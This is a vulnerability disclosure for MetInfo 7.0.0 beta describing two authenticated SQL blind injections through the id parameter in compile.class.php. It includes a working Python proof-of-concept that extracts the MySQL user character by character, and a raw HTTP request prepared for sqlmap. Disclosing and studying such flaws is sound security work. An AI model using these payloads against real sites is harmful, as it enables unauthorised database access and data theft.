# The MetInfo 7.0.0 beta Background SQL Blind Injection #

Description:In Metinfo 7.0.0 beta, SQL Injection was discovered in /app/system/include/class/view/compile.class.php via the id parameter.

## 1.Version Description: ##

Use the Google Chrome open this test site.download this version（```https://u.mituo.cn/api/metinfo/download/7.0.0beta```) and build a test site.

![](35.png)

Current version as follow.

![](30.png)

## 2.Number One SQL Injection(Need to login) ##

locate in /app/system/ui_set/admin/index.class.php line:474 to 484
![](33.png)

Line 481,all three parameters are retrieved from the form,The function doget_text_content call get_field_text,
and we follow the function locate in /app/system/include/class/view/compile.class.php line:294 to 309
![](34.png)


In $query, directly to the id in the SQL statement.And make a SQL Injection.

And then we use this url：

> http://127.0.0.1/admin/index.php?n=ui_set&m=admin&c=index&a=doget_text_content&table=lang&field=1&id=1

    
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    import requests
    import re
    payloads='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_-.'
    print ('Start to retrive current user:')
    user=''
    header={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Cookie':'Hm_lvt_520556228c0113270c0c772027905838=1570592565; re_url=http://127.0.0.1/admin/; PHPSESSID=e351ac2df468e9d187ecf31163c935dc; met_auth=e01fakMDoiG475LTUMYtNy2tJPH0tI8W7e3M7e12bzx8fIcVwM/3viTT6eJBMWuAfe6uqe8aB5BVMs3uz6XYBVz8zA;met_key=gCjlS1m;admin_lang=cn;page_iframe_url=http://127.0.0.1/index.php/lang=cn&pageset=1'#logged in admin's cookie
    }
    for i in range(1,23):
    for payload in payloads:
    url = "http://127.0.0.1/admin/index.php?n=ui_set&m=admin&c=index&a=doget_text_content&table=lang&field=1&id=1"
    exp = " and (ascii(mid(lower(user()),%d,1))=%d)" %(i,ord(payload))
    url_vul=url+exp
    response=requests.get(url_vul,headers=header)
    if re.findall('\"status\":1',response.text):
    user=user+payload
    print ('\n user is:',user,)
    break
    else:
    print ('.',end='')
    print ('\n[Done] current mysql user is %s' %user)


Run this poc script.

![](31.png)


And then we can get such as this page of mysql current user.

## 3.Number Two SQL Injection(Need to login) ##

The other SQL Injection is the same as above.locate in /app/system/ui_set/admin/index.class.php line:492 to 502
![](36.png)

The function doset_text_content call set_field_text,
and we follow the function locate in /app/system/include/class/view/compile.class.php line:311 to 330
![](37.png)


In $query, directly to the id in the SQL statement.And make a SQL Injection.

    GET /admin/index.php?n=ui_set&m=admin&c=index&a=doset_text_content&table=product&field=description&text=123456&id=10* HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: Hm_lvt_520556228c0113270c0c772027905838=1570592565,1570629746; PHPSESSID=e351ac2df468e9d187ecf31163c935dc; met_auth=e01fakMDoiG475LTUMYtNy2tJPH0tI8W7e3M7e12bzx8fIcVwM%2F3viTT6eJBMWuAfe6uqe8aB5BVMs3uz6XYBVz8zA; met_key=gCjlS1m; admin_lang=cn; page_iframe_url=http%3A%2F%2F127.0.0.1%2Findex.php%3Flang%3Dcn%26pageset%3D1; Hm_lpvt_520556228c0113270c0c772027905838=1570634168; arrlanguage=metinfo
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1

For simplicity I will use the sqlmap and get a sql injection,and get current mysql user successfully.
![](32.png)